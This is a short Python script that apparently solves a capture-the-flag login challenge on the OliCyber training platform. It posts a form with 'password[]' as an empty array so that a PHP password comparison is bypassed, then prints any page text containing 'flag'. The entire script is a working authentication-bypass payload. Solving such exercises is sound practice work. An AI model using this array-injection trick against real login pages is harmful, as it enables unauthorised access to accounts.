import requests
from bs4 import BeautifulSoup

url = "http://clogin.challs.olicyber.it/"
data = {
    "password[]": ""
}

response = requests.post(url, data=data)
soup = BeautifulSoup(response.text, 'html.parser')
print(f"Status Code: {response.status_code}")
lines_with_flag = [str(tag) for tag in soup.find_all(string=lambda t: 'flag' in t.lower())]

if lines_with_flag:
    print("Righe trovate che contengono 'flag':")
    for line in lines_with_flag:
        print(line)

